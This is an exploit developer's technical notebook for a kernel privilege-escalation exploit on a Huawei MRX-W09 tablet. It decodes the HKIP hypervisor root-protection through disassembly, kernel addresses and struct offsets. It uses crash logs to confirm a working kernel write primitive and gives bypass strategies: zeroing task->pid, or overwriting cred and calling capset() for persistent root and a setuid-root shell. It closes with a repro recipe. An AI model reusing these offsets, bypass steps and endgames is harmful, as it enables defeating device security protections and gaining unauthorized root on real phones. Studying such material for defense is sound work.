# HKIP decoded for MRX-W09 (Kirin 990, EMUI 11, Linux 4.14.116) — 2026-09-22

All addresses below are **link-time**; add the KASLR slide. Sources: `vmlinux.elf`
(`aarch64-linux-android-objdump`) + `nm_vmlinux.txt`, plus on-device confirmation
from `pstore` (`/sys/fs/pstore/console-ramoops-0`, readable with
`adb exec-out cat`; *directory listing* is denied but file reads are allowed).

## 1. Confirmation on device — the write primitive really lands

A run of the `--root 0` endgame (cred write to the leaked task) produced in the
previous boot's console log:

```
[pid:5532,cpu3,ghostlock_mrx]BUG: spinlock bad magic on CPU#3, ghostlock_mrx/5532
[pid:5532,cpu3,ghostlock_mrx] ... rt_mutex_adjust_prio_chain+0xa88/0xbac
[pid:5532,cpu3,ghostlock_mrx] ... rt_mutex_adjust_pi+0x124/0x174
[pid:5532,cpu3,ghostlock_mrx] ... __sched_setscheduler+0xf64/0x1634
[pid:5402,cpu0,ghostlock_mrx]UID root escalation!     <-- x3
```

* TGID 5402 = main thread (the leaked `g_task`), 5532 = the waiter (the walk).
* `UID root escalation!` proves **task address correct + cred write landed + HKIP active**.

`dmesg` is **not** readable by the shell user on this build
(`klogctl: Operation not permitted`), and `logcat -b kernel -d` is empty — so
`pstore` after a panic is the reliable kernel-log channel.

## 2. The hook: `generic_permission()`

```
ffffff800845a020 <generic_permission.cfi>:
  a03c: ldr  w8, [x0,#4]        ; inode->i_uid
  a04c: cbnz w8, .+0x38         ; i_uid != 0  -> NO hkip check at all
  a050: bl   ffffff80092c4cf0   ; hkip_check_uid_root.cfi
  a054: cbnz w0, .+0x70         ; nonzero -> return (deny)
  a058: ldr  w8, [x19,#8]       ; inode->i_gid
  a05c: cbnz w8, .+0x48         ; i_gid != 0  -> no check
  a060: bl   ffffff80092c4dac   ; hkip_check_gid_root.cfi
```

* **No global gate** — the check fires iff the inode is root-owned (`i_uid == 0`,
  or `i_gid == 0`). A root-cred process therefore dies on its first access to a
  root-owned inode (all of `/system`, `/proc/<pid>` for itself, etc.).
* Note: our *own* `/proc/self/*` becomes root-owned once `cred->uid == 0`
  (`task_dump_owner()`), so even `/proc/self/status` trips it.

## 3. `hkip_check_uid_root()` (0xffffff80092c4cf0)

```
mrs  x19, sp_el0
ldrsw x8, [x19,#2080]        ; current->pid   <-- the CACHED task_struct field (0x820)
cbz  w8, allow               ; *** pid == 0  =>  return 0 (ALLOW) ***
ubfx x9, x8, #15, #17
cbnz w9, check_creds         ; pid >= 32768 -> skip the bit array
adrp x10, hkip_uid_root_bits ; bits[pid>>3] >> (pid&7) & 1
... tst / b.ne allow         ; bit set -> allow
check_creds:
ldr  x8, [x19,#2536]         ; current->cred
ldr  w9, [x8,#4]  ; cbz -> escalate      ; uid  == 0
ldr  w9, [x8,#20] ; cbz -> escalate      ; euid == 0
ldr  w9, [x8,#12] ; cbz -> escalate      ; suid == 0
ldr  x9, [x8,#40] ; cbnz -> escalate     ; (cap field) nonzero
ldr  x9, [x8,#48] ; cbnz -> escalate     ; (cap field) nonzero
ldr  w8, [x8,#28] ; cbz  -> escalate     ; fsuid == 0
allow:  mov w0, #0 ; ret
escalate:
  adrp x0, "UID root escalation!" ; bl printk
  mov  w0, #9 ; mov w1,#1 ; mov x2,x19 ; bl force_sig_info   ; SIGKILL on current
  mov  w0, #-1 ; ret
```

`hkip_check_gid_root` (0xffffff80092c4dac) is the mirror image (gid/euid/sgid/
caps/fsgid, string `"GID root escalation!"`).
`hkip_check_xid_root` (0xffffff80092c4c28) = `check_uid`; if it returns nonzero
return nonzero, else run the gid check.

### The two usable bypasses

1. **`current->pid == 0`** → immediate `allow`, no bit array consulted. This is a
   plain `b`/`cbz`, not protected memory. **Chosen.**
2. The per-PID bit in the bit arrays — only settable through the hypervisor.

## 4. The bit arrays are hypervisor (ROWM) protected

```
hkip_uid_root_bits  0xffffff800b42c000  (.bss)
hkip_gid_root_bits  0xffffff800b42d000  (.bss)
hkip_addr_limit_bits 0xffffff800b42e000 (.bss)

ffffff800a971b08 <hkip_critdata_init.cfi>:
  hkip_hvc2(0xC6001040, &hkip_addr_limit_bits, 0x1000)
  hkip_hvc2(0xC6001040, &hkip_uid_root_bits,   0x1000)
  hkip_hvc2(0xC6001040, &hkip_gid_root_bits,   0x1000)
```

`0xC6001040` = HKIP_HVC_ROWM_REGISTER (addr, size). So a plain kernel write to
those pages is redirected/dropped (and a HOT walk to one of them coincided with
a panic). **Direct writes there are useless** — confirmed, not just assumed.

`hkip_register_rowm.cfi` (0xffffff80092c5668) is the same HVC; it requires the
range to be 4 KiB aligned (`tst x8,#0xfff` → `brk #0x800`).

## 5. The kernel's own bit-sync (HVC 0xC6001050 = SET_BIT)

```
ffffff80092c4a94 <hkip_update_xid_root.cfi>  (exported; ksymtab present)
ffffff80092c4e6c <hkip_init_task.cfi>        (static; stub at 0xffffff8009e7308c)
```

Both compute `w3 = "this cred looks like root"` from `cred+4/+20/+12` (uid, euid,
suid) and `cred+40/+48` (cap words) and then, for `pid != 0 && pid < 0x8000`:

```
ldrb w8,  [hkip_uid_root_bits + pid/8]
lsl  w9,  1, pid&7
tst  w9,  w8 ; cset w8,ne ; eor w8,w3,w8 ; cmp w8,#1 ; b.ne skip
mov  w0, #0x1050 ; movk w0,#0xc600,lsl#16
mov  x1, hkip_uid_root_bits ; x2 = pid ; x3 = w3
bl   hkip_hvc2            ; nonzero => brk #0x800
```

* `hkip_init_task(tsk)` derives its **uid** test from `tsk->real_cred`
  (`[x0,#0x9E0]`) and its **gid/addr_limit** tests from `current->cred`, then
  HVCs with `x2 = tsk->pid`. It also drops a `real_cred` reference and can
  RCU-free the old cred — i.e. it is an internal "cred changed / new task"
  hook, **not** a userspace-reachable interface.
* Consequently: **if this hook runs for a task whose cred is root, that task's
  HKIP bit is set by the hypervisor and the task becomes legally root.**

## 5b. Who calls the sync hooks (found with a full `.kernel`-section `bl` scan)

Exactly **two** call sites exist in the whole kernel:

* **`copy_process + 0xdf4`** (0xffffff800816ac08) → `hkip_init_task.cfi(child)`,
  immediately after `child->pid = ...` (`[x19,#2080]`) — so **every forked /
  cloned task** gets its bit set or cleared by the hypervisor according to the
  cred it inherited.
* **`commit_creds + 0x2b0`** (0xffffff80081aab30) → `hkip_update_xid_root.cfi(new)`,
  immediately after `current->real_cred`/`current->cred` are stored — so **any
  legitimate credential change re-syncs this task's bit**.

Therefore:

* Our direct `task->cred = &init_cred` write **bypasses `commit_creds()`**, which
  is precisely why HKIP killed the process ("UID root escalation!").
* Calling anything that reaches `commit_creds()` *after* the cred is root makes
  the hypervisor set our bits → a **legal, persistent** root.  `capset()` always
  commits (and is permitted once the cred holds the caps), hence `--capset`:

      cred = &init_cred   ->   capset(full)   ->   HVC sets uid+gid bits

  and from then on fork/exec work normally (children are handled by
  `copy_process → hkip_init_task`).
* This needs only **one** landing write, which is a big reliability win.

## 6. Endgame chosen for this port

`--pid0` mode (`ghostlock_mrx.c`):

1. `do_write(0, g_task+0x820)`  — zero the cached `task->pid`. HKIP now returns
   "allow" for this task. Verifiable: `/proc/self/status` then shows `Pid: 0`.
2. `do_write(&init_cred, g_task+0x9E0)` / `g_task+0x9E8)` — `real_cred`/`cred`
   = `init_cred` (uid 0, kernel SID ⇒ `u:r:kernel:s0`).
3. `pid0_final()` proves root, reads a root-only file, then tests whether the
   kernel re-syncs the HKIP bit for a **new** task:
   * FORK child: root-cred, reads a root-owned proc file directly. Survives ⇔
     fork (i.e. `hkip_init_task`) synced its bit → genuinely persistent root.
   * EXEC child: execs `/data/local/tmp/ghostlock_mrx --roottest` (a *non*
     root-owned binary, so the exec's own file access is never checked); then
     `--roottest` reads a root-owned proc file. Survives ⇔ the exec path synced
     the bit.

If either survives, a full root shell (and a setuid-root `/data/local/tmp/rsh`)
is produced by the child — with the HKIP bit set by the hypervisor, so it is
legal (no more SIGKILL).

### Why `task->pid = 0` is safe to use

`task->pid` is a *cached* field. `getpid()`/`getppid()`/`tgkill()`/`/proc/self`
all go through the `struct pid` (`task_tgid_vnr`, the pid hash), **not** this
field, so they keep working. `thread_group_leader()` uses `exit_signal`, not
`pid`. `fork()` sets the child's `pid` from the freshly allocated `struct pid`.
The main consumers are `task_pid_nr()` (printk/audit/debug output). Only the
`hkip_check_*_root()` fast path cares in our path.

## 7. Housekeeping

* `--hkip` (write the bit arrays directly) is provably futile (§4) but harmless;
  it also panicked once, consistent with an HHEE ROWM violation.
* `hkip_atkinfo` (driver `hkip_atkinfo_probe` / `hkip_atkinfo_check_enable`) is
  only an HHEE *event reporter*; no userspace bit interface exists.
* `g_hhee_enable` = 0xffffff800b42b700, `g_hhee_module` = 0xffffff800b42af38,
  `has_hhee` = 0xffffff8009e5c488 (`has_hhee.cfi` 0xffffff8008150030).
* PRMEM symbols exist for completeness (`set_prmem_ro`/`set_prmem_rw`,
  `prmem_bypass_protection`, `__start_data_prmem_rw` = 0xffffff800adc2000).

### Reliability: one walk per attempt, and a HOT walk must be the *last* walk

Observed across runs:

* `hot_wait()`-style probing works — the 3rd walk in a row reported
  `[!] WRITE OBSERVED (witness)` (= the store landed).
* **The walk *after* a HOT walk is what crashes** (stack-protector in
  `__schedule`, an SP/PC alignment exception, or `rb_insert_color_cached`
  faulting on a garbage `__rb_parent_color`). A "cold" walk is benign.
* Therefore `--capset` issues exactly **one walk per attempt** — the real
  `cred = &init_cred` store — and stops the moment `getuid()` reads 0. Only then
  does it call `capset()` (no root-owned inode is touched before that, since our
  own `/proc` entries become root-owned as soon as `cred->uid == 0`).
* `do_write()`'s eager `hit==2` path (read `/proc/self/{status,attr/current}`,
  `execl("/system/bin/sh")`) is suppressed in `--capset` mode for exactly that
  reason: execing a shell *before* `commit_creds()` syncs the bit would be
  SIGKILLed by HKIP.

## 10. The winning endgame and the ~10 ms HKIP timer window

pstore from a `--capset` run (the 3rd walk of the boot):

```
avc: denied { use } for pid=4711 comm="ghostlock_mrx" path="socket:[35502]" ...
      scontext=u:r:kernel:s0 tcontext=u:r:adbd:s0 tclass=fd
avc: denied { use } for pid=4711 ... path="/data/local/tmp/gl.stage" ...
      scontext=u:r:kernel:s0 tcontext=u:r:shell:s0 tclass=fd
[67.292236][pid:4711,cpu0,ghostlock_mrx]UID root escalation!
```

1. **The cred write lands** — `scontext=u:r:kernel:s0` on our own process proves
   `cred = &init_cred` worked and we are uid 0 in the kernel SID.
2. **SELinux then denies every fd we inherited from the shell domain** (the adb
   socket that carries stdout, and the stage file).  That is why *no further
   output appears*: it is not a crash.  The `echo exit=$?` that runs afterwards
   is executed by the shell (still `u:r:shell:s0`), so **exit status is a usable
   proof channel**.
3. The store happened at 67.2818 and the escalation at 67.2922 → **~10 ms**.  The
   HKIP check is therefore driven by a periodic timer / IRQ (consistent with the
   `clear_hkip_counter_timer` / `reset_hkip_irq_counters` symbols), not by our
   own syscalls.
4. Main was parked in `do_write()`'s `usleep(10000)` (10 ms) at that moment, so
   `capset()` never got to run.  Fix: run `capset()` **inside the detection
   branch, before any sleep or print**, and report via `_exit(42)`.

Note the per-task nature of `cred`: writing `task->cred` only changes **that
thread's** cred.  Each pthread has its own `task_struct`, so the capset must be
issued by the *same thread* whose cred was rewritten (the main thread, i.e. the
one `leak_task()` resolved) — not by the consumer/waiter.

### The three-way endgame on this device

| Path | Writes needed | Result |
|---|---|---|
| `task->pid = 0` then cred | 2 | HKIP "allow" for this task only; not persistent |
| cred = `&init_cred` then `capset()` | 1 | hypervisor sets the bit → legal, persistent root |
| direct write to the bit arrays | - | impossible: ROWM (HVC-registered) |

`--capset` uses the middle one; a child forked afterwards is covered by
`copy_process → hkip_init_task()`.

## 11. Repro procedure

Two device runs with `--pid0` (pid-zero write + cred write) showed:

* `[*] no write seen (uid=2000) ack=1` and `status Pid: nonzero (cold)` — the
  zero write to `task->pid` did **not** land.
* The following walk then panicked with
  `Kernel panic - not syncing: stack-protector: Kernel stack is corrupted in: __schedule+0xc28`
  on the **waiter** thread, via `work_pending -> do_notify_resume+0x21c ->
  __schedule`. So the FPSIMD stamp region (`E-0x270 .. E-0x70`) overlaps a live
  `__schedule` frame's canary slot when the sigreturn's return path takes
  `_TIF_NEED_RESCHED -> schedule()` (the exact path `stamp_sync()` tries to avoid
  by draining need-resched with two `sched_yield()` calls before `tgkill`).
* Earlier, `--root 0`/`--quiet` **did** land: the previous boot's log had
  `UID root escalation!` x3. Those runs *gate on the `perf_event_paranoid`
  oracle* (`hot_wait()`): alternate a benign sysctl value until the store is
  observed, then immediately do the real write while the mechanism is hot.
  `--pid0` now uses the same gating for every write.

Practical recipe (matches the other device ports): reboot, stay on the lock
screen (minimal user-space), retry; a panic+reboot is a normal failure mode.

### Structural correctness re-confirmed (new pstore, `pstore_pid0_2.log`)

```
[pid:4726,cpu3,ghostlock_mrx]Internal error: Oops: 96000006 [#1] PREEMPT SMP
[pid:4726,cpu3,ghostlock_mrx]PC is at rb_insert_color_cached+0x18/0x170
[pid:4724,cpu2,ghostlock_mrx]Kernel panic - not syncing: stack-protector:
      Kernel stack is corrupted in: __schedule+0xc28
```

`rb_insert_color_cached` is inside `rt_mutex_enqueue()` — i.e. the walk **did**
reach the write-performing enqueue path (the fake lock's `waiters.rb_root` is 0,
so `rb_link_node()` stores the waiter address there and `rb_insert_color_cached`
then treats our `tree_entry.__rb_parent_color` as the parent). The fault means
that field was **garbage**, i.e. the stamped kernel-stack window was clobbered
before the walk read it (partial clobber), and the *same run* also hit the
`__schedule` canary abort. Both are stack-window races, not payload/geometry
errors — the geometry and the primitive are right; the delivery is racy.


